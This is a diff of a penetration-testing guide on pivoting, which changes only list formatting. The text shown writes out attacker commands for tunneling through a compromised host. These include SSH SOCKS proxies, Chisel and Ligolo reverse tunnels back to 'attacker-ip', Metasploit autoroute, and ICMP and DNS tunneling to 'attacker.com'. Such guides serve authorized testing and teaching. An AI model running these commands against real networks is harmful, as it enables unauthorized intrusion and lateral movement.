@@ -38,20 +38,20 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
   - Extract credentials if possible (e.g., from memory dumps or configuration files).
 
 4. Establish Pivoting
-    a. SSH Tunneling (Dynamic and Local Port Forwarding)
+    - SSH Tunneling (Dynamic and Local Port Forwarding)
         - Create a SOCKS proxy to route traffic: `ssh -D 1080 -N user@compromised-host`
         - Use local port forwarding to expose internal services: `ssh -L 8080:10.10.0.10:80 user@compromised-host`
-    b. ProxyChains
+    - ProxyChains
         - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
         - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
-    c. Chisel (Fast TCP/UDP Tunneling)
+    - Chisel (Fast TCP/UDP Tunneling)
         - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
         - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
         - Use ProxyChains with Chisel for further tunneling.
-    d. Ligolo (Auto Route Creation)
+    - Ligolo (Auto Route Creation)
         - On attacker's machine: `./ligolo -reverse -listen :9090`
         - On compromised machine: `./ligolo -connect attacker-ip:9090`
-    e. Metasploit Pivoting
+    - Metasploit Pivoting
         - Use autoroute to add routes through the compromised system: `run autoroute -s 10.10.0.0/24`
         - Use socks4a module to enable ProxyChains:
           ```bash
@@ -59,15 +59,15 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
           set SRVPORT 1080
           exploit
           ```
-    f. SSHuttle Pivoting
+    - SSHuttle Pivoting
         - Transparently route traffic through an SSH connection: `sshuttle -r user@compromised-host 10.10.0.0/24`
-    g. Plink (PuTTY Link) Pivoting
+    - Plink (PuTTY Link) Pivoting
         - Windows-based SSH tunneling: `plink.exe -D 1080 -N user@compromised-host`
-    h. RDP Pivoting
+    - RDP Pivoting
         - Use RDP to connect to internal machines: `xfreerdp /u:user /p:password /v:10.10.0.10`
-    i. ICMP Tunneling
+    - ICMP Tunneling
         - Use tools like icmptunnel to route traffic over ICMP: `./icmptunnel -s attacker-ip`
-    j. DNS Tunneling
+    - DNS Tunneling
         - Use iodine to tunnel traffic over DNS: `iodine -f -P password -r attacker.com`
   
 5. Routing Traffic Through Compromised Host
